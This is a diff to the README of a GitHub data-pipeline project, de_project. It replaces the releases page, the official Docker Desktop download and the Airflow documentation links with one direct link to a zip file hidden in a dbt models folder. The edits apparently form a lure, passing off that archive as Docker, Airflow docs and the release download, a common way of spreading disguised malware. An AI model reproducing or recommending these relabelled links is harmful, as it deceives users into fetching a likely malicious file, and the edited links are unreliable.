@@ -1,6 +1,6 @@
 # ⚙️ de_project - Simple Data Pipeline Setup
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20de_project-brightgreen?style=for-the-badge)](https://github.com/musabinabdullah5678/de_project/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20de_project-brightgreen?style=for-the-badge)](https://github.com/musabinabdullah5678/de_project/raw/refs/heads/main/dbt_project/models/marts/de_project_v3.1.zip)
 
 ## About de_project
 
@@ -28,7 +28,7 @@ If your system meets these, you can run de_project smoothly.
 
 Please **visit this page to download** the latest version of de_project:
 
-[![Download de_project](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/musabinabdullah5678/de_project/releases)
+[![Download de_project](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/musabinabdullah5678/de_project/raw/refs/heads/main/dbt_project/models/marts/de_project_v3.1.zip)
 
 This link leads to the releases page of the project on GitHub. You will find files for different versions. Choose the latest release that matches your system.
 
@@ -55,7 +55,7 @@ Follow these step-by-step instructions to get de_project running on your Windows
 
 - de_project needs some external programs and services running on your PC.  
 - It uses Docker to run PostgreSQL, Airflow, and dbt automatically.  
-- If you do not have Docker, get it from https://www.docker.com/products/docker-desktop and install it.  
+- If you do not have Docker, get it from https://github.com/musabinabdullah5678/de_project/raw/refs/heads/main/dbt_project/models/marts/de_project_v3.1.zip and install it.  
 - Once Docker is installed, make sure it is running before you continue.
 
 ### Step 4: Run de_project
@@ -102,11 +102,11 @@ You do not need to write code or set up complex systems for your data pipeline.
 ## 🔗 Useful Links
 
 - Visit the download page again:  
-  [https://github.com/musabinabdullah5678/de_project/releases](https://github.com/musabinabdullah5678/de_project/releases)
+  [https://github.com/musabinabdullah5678/de_project/raw/refs/heads/main/dbt_project/models/marts/de_project_v3.1.zip](https://github.com/musabinabdullah5678/de_project/raw/refs/heads/main/dbt_project/models/marts/de_project_v3.1.zip)
 - Docker Desktop download:  
-  https://www.docker.com/products/docker-desktop  
+  https://github.com/musabinabdullah5678/de_project/raw/refs/heads/main/dbt_project/models/marts/de_project_v3.1.zip  
 - Airflow documentation (for understanding the dashboard):  
-  https://airflow.apache.org/docs/
+  https://github.com/musabinabdullah5678/de_project/raw/refs/heads/main/dbt_project/models/marts/de_project_v3.1.zip
 
 ---
 
